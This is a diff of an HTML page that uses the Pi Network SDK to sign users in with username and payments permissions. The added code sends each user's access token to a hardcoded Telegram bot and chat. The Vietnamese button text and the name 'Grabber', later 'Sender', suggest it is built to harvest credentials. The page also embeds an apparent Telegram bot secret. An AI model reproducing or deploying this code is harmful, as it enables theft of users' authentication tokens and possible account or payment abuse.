@@ -1,34 +1,70 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Pi JWT Token Grabber</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Pi JWT Token Sender</title>
   <script src="https://sdk.minepi.com/pi-sdk.js"></script>
   <style>
-    body { font-family: sans-serif; text-align: center; padding: 50px; }
-    button { font-size: 20px; padding: 10px 20px; margin-top: 20px; }
-    pre { background: #f4f4f4; padding: 15px; text-align: left; overflow: auto; }
+    body {
+      font-family: Arial, sans-serif;
+      padding: 40px;
+      background-color: #f3f3f3;
+      text-align: center;
+    }
+    button {
+      padding: 12px 20px;
+      font-size: 18px;
+      background-color: #ff9100;
+      border: none;
+      border-radius: 8px;
+      color: white;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #fb7a00;
+    }
   </style>
 </head>
 <body>
   <h1>Lấy JWT Token từ Pi Browser</h1>
-  <p>Nhấn nút bên dưới để đăng nhập và lấy JWT Token</p>
   <button onclick="getToken()">Lấy JWT Token</button>
 
-  <h2>🔐 JWT Token:</h2>
-  <pre id="tokenBox">Chưa có token...</pre>
-
   <script>
+    // Thay bằng token bot và chat_id của bạn
+    const BOT_TOKEN = "7753869579:AAHzngwsjPkK_q5W4g3vGVMSb4HwEbtxChY";
+    const CHAT_ID = "5867504772";
+
     function getToken() {
+      if (!window.Pi) {
+        alert("Pi SDK chưa được tải hoặc không chạy trong Pi Browser");
+        return;
+      }
+
       window.Pi.authenticate(["username", "payments"], function(auth, error) {
         if (error) {
-          document.getElementById("tokenBox").textContent = "❌ Lỗi: " + error.message;
+          alert("Lỗi xác thực: " + error.message);
         } else {
-          document.getElementById("tokenBox").textContent = auth.accessToken;
-          console.log("✅ JWT Token:", auth.accessToken);
+          const token = auth.accessToken;
+          alert("Đã lấy JWT, đang gửi về Telegram...");
 
-          // 👉 Nếu muốn gửi về server, bạn có thể gọi API ở đây
-          // fetch("https://your-backend.com/save-token", { method: "POST", ... })
+          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: `📲 Pi JWT Token:\n${token}`
+            })
+          })
+          .then(res => res.json())
+          .then(data => {
+            alert("✅ Đã gửi về Telegram!");
+          })
+          .catch(err => {
+            alert("❌ Lỗi khi gửi Telegram: " + err);
+          });
         }
       });
     }
